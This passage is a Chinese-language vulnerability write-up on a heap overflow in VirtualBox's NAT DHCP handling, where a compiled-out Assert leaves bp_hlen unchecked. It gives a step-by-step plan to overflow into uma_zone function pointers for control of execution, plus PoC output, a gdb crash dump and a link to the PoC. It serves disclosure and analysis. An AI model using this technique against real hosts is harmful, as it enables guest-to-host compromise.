        {
            case RENEWING:
     . . .
                   Assert((bp->bp_hlen == ETH_ALEN));
                   memcpy(bc->macaddr, bp->bp_hwaddr, bp->bp_hlen);
                   bc->addr.s_addr = bp->bp_ciaddr.s_addr;
                }
                break;
            case INIT_REBOOT:
     . . .
                Assert((bp->bp_hlen == ETH_ALEN));
                memcpy(bc->macaddr, bp->bp_hwaddr, bp->bp_hlen);
                bc->addr.s_addr = ui32;
                break;
    . . .
    }
在解析`DHCPREQUEST`数据包时，没有验证`bp-> bp_hlen`字段。断言语句Assert((bp-> bp_hlen ==
ETH_ALEN))在release版本中不编译，当将`bp_hwaddr`从伪造的DHCP数据包复制到`BOOTPClient`结构中的`macaddr`字段时，会导致堆缓冲区溢出。
`p_hlen`是一个字节，因此最大值可以是255。但是，`BOOTPClient`结构数组的大小大于`300`字节。由于没有关键数据可以破坏，因此在此数组中溢出并不是很有效。为了使这个溢出有效，我们必须到达`BOOTPClient`结构数组的末尾(`pbootp_clients`)。
`pbootp_clients`数组可以存储有关16个客户端请求`[0 ...
15]`的信息。在VM初始化期间，数组中的第一个元素已使用了访客IP地址。为了将更多客户端请求添加进该数组，guest虚拟机可以发送另外14个具有唯一信息的`DHCPREQUEST`数据包。处理第15个`DHCPREQUEST`数据包时，通过将`bp_hlen`设置为最大值来触发溢出。
由于`pbootp_clients`是在VM初始化过程中早期分配的，并且溢出限制为最多`255`个字节，因此相邻缓冲区需要有趣。在Ubuntu
16.04中测试VirtualBox
5.0.26时，相邻的缓冲区是在`src/Vbox/Devices/Network/slirp/zone.h`中定义的uma_zone结构。
    # define ZONE_MAGIC 0xdead0002
    struct uma_zone
    {
        uint32_t magic;
        PNATState pData; /* to minimize changes in the rest of UMA emulation code */
        RTCRITSECT csZone;
        const char *name;
        size_t size; /* item size */
        ctor_t pfCtor;
        dtor_t pfDtor;
        zinit_t pfInit;
        zfini_t pfFini;
        uma_alloc_t pfAlloc;
        uma_free_t pfFree;
        int max_items;
        int cur_items;
        LIST_HEAD(RT_NOTHING, item) used_items;
        LIST_HEAD(RT_NOTHING, item) free_items;
        uma_zone_t master_zone;
        void *area;
        /** Needs call pfnXmitPending when memory becomes available if @c true.
         * @remarks Only applies to the master zone (master_zone == NULL) */
        bool fDoXmitPending;
    };
此结构用于在`src/Vbox/Devices/Network/slirp/misc.c`中定义的函数。破坏`pfCtor`，`pfDtor`，`pfInit`，`pfFini`，`pfAlloc`或`pfFree`会在`NAT`线程或每个`vCPU
EMT`线程中拿到RIP控制权。
    $ sudo ./poc enp0s3
    [sudo] password for renorobert: 
    poc: [+] Using interface enp0s3...
    poc: [+] Sending DHCP requests...
    poc: [+] Current IP address : 10.0.2.15
    poc: [+] Requesting IP address : 10.0.2.16
    poc: [+] Requesting IP address : 10.0.2.17
    poc: [+] Requesting IP address : 10.0.2.18
    poc: [+] Requesting IP address : 10.0.2.19
    poc: [+] Requesting IP address : 10.0.2.20
    poc: [+] Requesting IP address : 10.0.2.21
    poc: [+] Requesting IP address : 10.0.2.22
    poc: [+] Requesting IP address : 10.0.2.23
    poc: [+] Requesting IP address : 10.0.2.24
    poc: [+] Requesting IP address : 10.0.2.25
    poc: [+] Requesting IP address : 10.0.2.26
    poc: [+] Requesting IP address : 10.0.2.27
    poc: [+] Requesting IP address : 10.0.2.28
    poc: [+] Requesting IP address : 10.0.2.29
    poc: [+] Requesting IP address : 10.0.2.30
    poc: [+] Overflowing bootp_clients into uma_zone structure…
    gdb-peda$ c
    Continuing.
    Thread 11 "EMT" received signal SIGSEGV, Segmentation fault.
    [Switching to Thread 0x7fd20e4af700 (LWP 27148)]
    [----------------------------------registers-----------------------------------]
    RAX: 0xfffffe95 
    RBX: 0x7fd1f05ea330 ("CCCCCCCC", 'B' , "\b")
    RCX: 0x0 
    RDX: 0x0 
    RSI: 0x42424242 ('BBBB')
    RDI: 0x7fd1f05ea330 ("CCCCCCCC", 'B' , "\b")
    RBP: 0x7fd20e4aeb70 --> 0x7fd20e4aebd0 --> 0x7fd20e4aec10 --> 0x7fd20e4aecd0 --> 0x7fd20e4aece0 --> 0x7fd20e4aed40 (--> ...)
    RSP: 0x7fd20e4aeb50 --> 0x7fd1f05e7160 --> 0x0 
    RIP: 0x7fd1df22308e (call   QWORD PTR [rbx+0x70])
    R8 : 0x0 
    R9 : 0x0 
    R10: 0x7fd20d529230 --> 0x7fd1df1e5be0 (push   rbp)
    R11: 0x0 
    R12: 0x7fd1f0852080 --> 0x800 
    R13: 0x7fd20e4aeb90 --> 0x100000002 
    R14: 0x7fd1f05ea340 ('B' , "\b")
    R15: 0x7fd1f05e6f30 --> 0x7fd1df21c5a0 (push   rbp)
    EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x7fd1df223086: xor    edx,edx
       0x7fd1df223088: mov    esi,DWORD PTR [rbx+0x48]
       0x7fd1df22308b: mov    rdi,rbx
    => 0x7fd1df22308e: call   QWORD PTR [rbx+0x70]
       0x7fd1df223091: test   rax,rax
       0x7fd1df223094: mov    r12,rax
       0x7fd1df223097: je     0x7fd1df2230b5
       0x7fd1df223099: mov    rax,QWORD PTR [rbx+0x50]
    Guessed arguments:
    arg[0]: 0x7fd1f05ea330 ("CCCCCCCC", 'B' , "\b")
    arg[1]: 0x42424242 ('BBBB')
    arg[2]: 0x0 
    arg[3]: 0x0 
    [------------------------------------stack-------------------------------------]
    0000| 0x7fd20e4aeb50 --> 0x7fd1f05e7160 --> 0x0 
    0008| 0x7fd20e4aeb58 --> 0x7fd1f0852080 --> 0x800 
    0016| 0x7fd20e4aeb60 --> 0x7fd1f0852088 --> 0x7fd1dd262f88 --> 0x8ffffffffffff 
    0024| 0x7fd20e4aeb68 --> 0x11a 
    0032| 0x7fd20e4aeb70 --> 0x7fd20e4aebd0 --> 0x7fd20e4aec10 --> 0x7fd20e4aecd0 --> 0x7fd20e4aece0 --> 0x7fd20e4aed40 (--> ...)
    0040| 0x7fd20e4aeb78 --> 0x7fd1df22339f (test   rax,rax)
    0048| 0x7fd20e4aeb80 --> 0x7fd20e4aebb0 --> 0x0 
    0056| 0x7fd20e4aeb88 --> 0x7fd1f0000020 --> 0x200000000 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x00007fd1df22308e in ?? () from /usr/lib/virtualbox/VBoxDD.so
    gdb-peda$ x/gx $rbx+0x70
    0x7fd1f05ea3a0: 0xdeadbeef00000000
以上两个漏洞的POC可以在这里下载[virtualbox-nat-dhcp-bugs](https://github.com/renorobert/virtualbox-nat-dhcp-bugs)